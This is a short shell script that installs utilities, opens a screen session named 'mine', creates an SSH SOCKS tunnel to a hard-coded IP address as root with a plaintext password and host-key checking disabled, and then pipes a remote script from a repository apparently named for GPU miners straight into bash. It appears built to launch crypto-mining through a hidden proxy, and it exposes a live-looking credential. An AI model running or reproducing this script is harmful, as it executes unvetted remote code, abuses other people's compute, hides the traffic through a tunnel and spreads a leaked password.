#!/bin/sh
apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt -y install libpci-dev apt-utils wget nano net-tools htop whiptail dialog sshpass screen > /dev/null
screen -S mine
sshpass -p Pmataga87465622 sh -c 'ssh -o StrictHostKeyChecking=no -f -N -A -D 9999 root@35.172.228.165 && sleep .1'
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/start_nbEthermMandy.sh | bash
